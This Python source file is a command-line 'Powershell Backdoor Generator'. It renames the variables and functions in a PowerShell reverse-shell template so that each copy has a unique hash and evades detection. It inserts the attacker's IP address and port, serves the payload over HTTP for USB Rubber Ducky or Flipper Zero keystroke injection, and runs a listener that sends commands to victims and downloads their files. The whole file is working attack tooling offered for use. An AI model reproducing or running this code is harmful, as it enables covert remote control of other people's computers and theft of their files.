import os
import time
import socket
import argparse
from core.utils import *
from core.config import *
from core.payloads import *

BLOCKSIZE = 65536
READ_AMOUNT = 50*1024

CWD = os.getcwd() + "\\"

# This is used for generating a new name for each 
# variable and function in the powershell script. 
# The script is then base64 encoded ensuring a unique hash
POWERSHELL_SCRIPT_OBJECTS: list = [
    "UserDefinedIPAddress",
    "UserDefinedPort",
    "activeClient",
    "activeStream",
    "textBuffer",
    "textEncoding",
    "sessionWriter",
    "sessionReader",
    "createBackdoorConnection",
    "handleActiveClient",
    "writeToStream",
    "currentUser",
    "computerName",
    "pwd",
    "prompt",
    "rawResponse",
    "response",
    "output",
    "content",
    "readCount"
]

class Backdoor:
    def __init__(self, config: Config) -> None:
        """ Creates the backdoor
        :param config: Config object
        """
        self.config = config
        self.sock: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    def handle_usb_payload(self) -> None:
        """ Creates ducky script/flipper script if needed
        """
        payload = None
        if self.config.payload:
            payload = fetch(self.config.payload, self.config)
        if not payload and (self.config.ducky or self.config.flipper):
            return False
        elif not payload:
            return True
        self.start_threaded_http_server()
        result =  payload.execute()
        if not result:
            payload.stop()
        return result

    def create_backdoor(self):
        """ Creates the backdoor file
        """
        if not self.obfuscate_backdoor():
            self.print_verbose_message("Failed to encode backdoor", prefix="-")
            exit()
        hash = get_sha1_file_hash(self.config.out_file)
        self.print_verbose_message(f"Saved backdoor {self.config.out_file} sha1:{hash}")
        if self.config.flipper or self.config.ducky:
            if not self.handle_usb_payload():
                self.print_verbose_message(f"Failed to process payload: {self.config.payload}", prefix="-")
                exit()

    def __just_one_please(self):
        """
        Processes One HTTP request then quits
        """
        # Holds
        self.httpd.handle_request()
        print(f"[*] Stopping HTTP server")
        self.httpd.shutdown()

    def start_threaded_http_server(self) -> None:
        """ Creates a thread for a HTTP server hosting our current working directory     
        """
        self.httpd = socketserver.TCPServer(self.config.server_ip_tuple, SimpleHTTPRequestHandler)
        thread = Thread(target=self.__just_one_please)
        thread.daemon = True
        thread.start()
        print(f"[*] Started HTTP server hosting directory http://{self.config.ip_address}:{self.config.server_port}/ ")

    def start_session(self):
        """ Creates the listener
        """
        print(f"[*] Starting Backdoor Listener {self.config.ip_address}:{self.config.port} use CTRL+BREAK to stop")
        self.sock.bind(self.config.ip_tuple)
        while True:
            self.sock.listen(1)
            connection, address = self.sock.accept()
            self.print_verbose_message(f"Recieved connection from {address[0]}:{address[1]}")
            self.handle_client(connection)

    def obfuscate_backdoor(self) -> bool:
        """ obfuscates the backdoor source template.ps1
        :return: True if the backdoor was obfuscated
        """
        self.print_verbose_message(f"Encoding backdoor script")
        backdoor = get_file_content(self.config.BACKDOOR_TEMPLATE)
        if not backdoor:
            return False
        for powershell_object in POWERSHELL_SCRIPT_OBJECTS:
            backdoor = obfuscate(backdoor, powershell_object)

        backdoor = backdoor.replace("4444", str(self.config.port))
        backdoor = backdoor.replace("0.0.0.0", self.config.ip_address)
        return save_content_to_file(backdoor, self.config.out_file)

    def handle_client(self, connection):
        """ Handles an active backdoor session
        :param connection: Active backdoor session
        """
        print("[*] Connected, press [enter] to start the session")
        try:
            while True:
                time.sleep(.5)
                prompt = format_string(connection.recv(READ_AMOUNT))

                command = input(f"{prompt.strip()} ")

                if len(command) == 0:
                    command += "ls | Out-Null"

                time.sleep(.5)
                connection.sendto(command.encode(), self.config.ip_tuple)
                if "get_file" in command and "--help" not in command:
                    self.download_remote_file(command, connection)
                    continue
                print(format_string(self.recvall(connection)))

        # Disconnect
        except ConnectionResetError:
            return

    def download_remote_file(self, command , connection):
        """ Downloads a remote file from a backdoor session
        :param command: Command to read the file location from
        :param connection: Active backdoor session
        """
        command = command.split(" ")
        try:
            file_location = command[2]
        except KeyError:
            print("Downloads a remote file and saves it to your local computer \nsyntax: get_file <remote_path> <local_path>\nPlease use absolute paths!")
            return False
        data = self.recvall(connection)
        if save_content_to_file(data, file_location):
            self.print_verbose_message(f"Saved content {len(data)} to {file_location}")
        return True

    def recvall(self, connection):
        """ Receives all data in a socket connection
        :param connection: Connection to read data from
        :param data: Previous data parts
        """
        data: bytes = b""
        while True:
            part = connection.recv(READ_AMOUNT)
            # print(len(part))
            data += part
            if len(part) < READ_AMOUNT:
                # either 0 or end of data
                self.print_verbose_message(f"done recv {len(data)}")
                break
        return data

    def print_verbose_message(self, message: str, prefix: str = "*"):
        """ Prints a verbose message
        :param message: Message to print
        :param prefix: Prefix to add before message e.g - == [-] Message
        """
        if self.config.verbose:
            if prefix:
                prefix = f"[{prefix}] "
            print(prefix + message)

    def stop(self):
        """ Stops the TCP listener and ducky-server if started
        """
        self.sock.close()

    def start(self) -> None:
        if not self.config.just_listen_and_host and not self.config.just_listen:
            self.create_backdoor()
        elif self.config.just_listen_and_host:
            self.start_threaded_http_server()
        self.start_session()

def main(args) -> None:
    """ Creates a backdoor
    """
    try:
        config = Config(CWD, **vars(args))
        if config.list_payloads:
            show_help()
            exit()
        l = Backdoor(config)
        l.start()
    except KeyboardInterrupt:
        l.stop()
        exit("[*] Backdoor: CTRL+C Detected exiting!")
    except ConnectionResetError as e:
        l.stop()
        exit(f"Exiting! {e}")

if __name__ ==  "__main__":
    parser = argparse.ArgumentParser(description="Powershell Backdoor Generator")
    parser.add_argument(
        "--ip-address",
        "-i",
        help=f"IP Address to bind the backdoor too (default: {get_ip_address()})", 
        default=get_ip_address(),
    )
    parser.add_argument(
        "--port",
        "-p",
        help=f"Port for the backdoor to connect over (default: 4444)", 
        default=4444,
        type=int
    )
    parser.add_argument(
        "--random",
        "-r",
        help=f"Randomizes the outputed backdoor's file name", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "--out",
        "-o",
        help=f"Specify the backdoor filename (relative file names)", 
        default="backdoor.ps1",
    )
    parser.add_argument(
        "--verbose",
        "-v",
        help=f"Show verbose output", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "--delay",
        help=f"Delay in milliseconds before Flipper Zero/Ducky-Script payload execution (default:100)", 
        default=100,
    )
    parser.add_argument(
        "--flipper",
        help=f"Payload file for flipper zero (includes EOL conversion) (relative file name)", 
    )
    parser.add_argument(
        "--ducky",
        help=f"Creates an inject.bin for the http server", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "--server-port",
        help=f"Port to run the HTTP server on (--server) (default: 8080)", 
        default=8080,
    )
    parser.add_argument(
        "--payload",
        help=f"USB Rubber Ducky/Flipper Zero backdoor payload to execute", 
    )
    parser.add_argument(
        "--list-payloads",
        help=f"List all available payloads", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "-k",
        "--keyboard",
        help=f"Keyboard layout for Bad Usb/Flipper Zero (default: us)", 
        default="us",
    )
    parser.add_argument(
        "-A",
        "--actually-listen",
        help=f"Just listen for any backdoor connections", 
        default=False,
        action="store_true"
    )
    parser.add_argument(
        "-H",
        "--listen-and-host",
        help=f"Just listen for any backdoor connections and host the backdoor directory", 
        default=False,
        action="store_true"
    )
    args = parser.parse_args()
    main(args)